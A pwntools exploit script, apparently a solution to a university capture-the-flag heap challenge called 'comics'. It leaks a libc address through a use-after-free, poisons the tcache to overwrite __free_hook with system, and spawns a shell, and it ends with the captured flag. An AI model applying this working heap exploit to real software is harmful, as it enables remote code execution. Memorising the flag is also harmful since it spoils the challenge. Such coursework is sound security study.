from pwn import *

# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-f']

CHALLENGE = "./comics"
URL = "offsec-chalbroker.osiris.cyber.nyu.edu"
PORT = 1214
NETID = b"xz4344"
LOCAL = False

if LOCAL:
    p = process(CHALLENGE)
else:
    p = remote(URL, PORT)
    p.recvuntil(b"NetID (something like abc123): ")
    p.sendline(NETID)

# p = gdb.debug(CHALLENGE, '''
#     b *(main+201)
#     b *(main+213)      
#     b *(main+225)
#     b *(main+237)                    
#     continue
# ''')

def create_comic(text):
    print(p.recvuntil(b"> ").decode())
    p.send(b"1")
    print(p.recvuntil(b"> ").decode())
    p.send(text)
    log.info(f"Creating a comic with text: {text}")

def print_comic(number):
    print(p.recvuntil(b"> ").decode())
    p.send(b"2")
    print(p.recvuntil(b"> ").decode())
    p.send(str(number).encode())
    log.info(f"Printing the comic at number: {number}")
    return u64(p.recvuntil(b".--===++###################*+++++++++===---...\n")[0x199:0x199+6].ljust(8, b"\x00"))

def edit_comic(number, text):
    print(p.recvuntil(b"> ").decode())
    p.send(b"3")
    print(p.recvuntil(b"> ").decode())
    p.send(str(number).encode())
    print(p.recvuntil(b"> ").decode())
    p.send(text)
    log.info(f"Editing the comic at number: {number} with text: {text}")
    print(p.recvuntil(b"> ").decode())

def delete_comic(number):
    print(p.recvuntil(b"> ").decode())
    p.send(b"4")
    print(p.recvuntil(b"> ").decode())
    p.send(str(number).encode())
    log.info(f"Deleting the comic at number: {number}")

# Stage 1: Leak libc address
create_comic(b"A"*0x410)
create_comic(b"B"*0x8)
delete_comic(0)
leaked_glibc_addr = print_comic(0)
log.info(f"Receiving leaked glibc address: {hex(leaked_glibc_addr)}")

# Stage 2: Calculate required addresses
glibc_e = ELF("libc.so.6")
glibc_base_addr = (leaked_glibc_addr & ~0xfff) - 0x1ec000
glibc_free_hook_addr = glibc_base_addr + glibc_e.symbols.__free_hook
glibc_system_addr = glibc_base_addr + glibc_e.symbols.system

# Stage 3: Prepare for tcache poisoning
create_comic(b"C"*0x410)
create_comic(b"D"*0x8)
delete_comic(1)
delete_comic(3)

# Stage 4: Perform tcache poisoning
edit_comic(3, p64(glibc_free_hook_addr))
create_comic(b"/bin/sh\x00")
create_comic(p64(glibc_system_addr))

# Stage 5: Trigger system("/bin/sh")
delete_comic(4)

p.interactive()

# flag{T_c4ch3_p0150n1ng_15_s000000_c0mic4l_42223a7387d8f812}
